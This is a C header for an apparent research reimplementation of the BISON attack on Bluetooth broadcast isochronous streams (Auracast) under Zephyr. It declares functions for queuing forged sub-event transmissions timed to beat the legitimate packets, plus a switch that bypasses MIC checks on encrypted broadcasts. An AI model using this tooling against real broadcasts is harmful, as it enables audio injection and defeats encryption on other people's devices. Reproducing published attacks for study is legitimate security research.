/*
 * SPDX-License-Identifier: Apache-2.0
 * BISON reimplementation from the "BISON: Attacking Bluetooth’s Broadcast Isochronous Streams" paper.
 * Adapted to work with Zephyr's interleaved implementation and to (hopefully) cover real-world
 * Auracast configurations (which have more subevents and than the original implementation)
 */

#ifndef BISON_LLL_HIJACK_H_
#define BISON_LLL_HIJACK_H_

#include <stdbool.h>
#include <stdint.h>

#define BISON_LLL_HIJACK_PDU_MAX 251U

struct bison_lll_hijack_req {
	uint16_t event_counter;

	/* Offset from the BIG event anchor, in microseconds, where the
	 * radio should send. Computed from bison_predict_subevent().
	 */
	uint32_t time_offset_us;

	/* RF configuration for the sub-event slot. */
	uint8_t access_addr[4];
	uint8_t crc_init[3];
	uint8_t channel_index;
	uint8_t phy;

	/* PDU header */
	uint8_t llid;            /* pdu_bis::ll_id, 2 bits */
	uint8_t cssn;            /* pdu_bis::cssn,  3 bits */
	uint8_t cstf;            /* pdu_bis::cstf,  1 bit  */

	uint8_t pdu_len;
	uint8_t pdu_data[BISON_LLL_HIJACK_PDU_MAX];
};

/**
 * @brief Enqueue a forged sub-event TX to be fired by SYNC_ISO's prepare_cb.
 *
 * @return 0 on success, -ENOSPC if the queue is full, -EINVAL on bad input.
 */
int bison_lll_hijack_enqueue(const struct bison_lll_hijack_req *req);

/**
 * @brief Free slots currently in the queue.
 *
 * Callers that need to enqueue N entries atomically should check this
 * first (>= N) rather than discovering -ENOSPC mid-way through.
 */
int bison_lll_hijack_available(void);

/**
 * @brief Set early TX offset. 
 *
 * Set offset for earlier TX time. The idea is that we have our packets arrive
 * earlier than the benign one. Not sure yet if this is really useful.
 */
void bison_lll_hijack_set_early_us(uint32_t us);

/**
 * @brief Read the current early-TX offset.
 */
uint32_t bison_lll_hijack_get_early_us(void);

/**
 * @brief Enable / disable the BISQuit encrypted-BIS MIC bypass.
 *
 * When set, `lll_sync_iso.c`'s MIC-validity assertion is skipped so
 * our device can stay synced to an encrypted BIG without holding the
 * correct Broadcast_Code.
 *
 * Toggle BEFORE calling `bt_iso_big_sync()` on an encrypted target.
 */
void bison_lll_hijack_bisquit_bypass_set(bool active);

/**
 * @brief Read the bisquit MIC-bypass flag.
 */
bool bison_lll_hijack_bisquit_bypass_get(void);

/**
 * @brief LLL side: peek the head entry if it targets @p event_counter.
 *
 * Safe from ISR context. Returned pointer is valid until the next
 * bison_lll_hijack_consume() (or _flush_stale) is called.
 */
const struct bison_lll_hijack_req *bison_lll_hijack_peek(uint16_t event_counter);

/**
 * @brief LLL side: pop the head entry
 */
void bison_lll_hijack_consume(void);

/**
 * @brief Drop any queued entries with event_counter <= @p event_counter.
 *
 * Called by lll_sync_iso when it starts processing a new BIG event so
 * stale requests don't sit at the head and block newer TXs.
 */
void bison_lll_hijack_flush_stale(uint16_t event_counter);

#endif /* BISON_LLL_HIJACK_H_ */
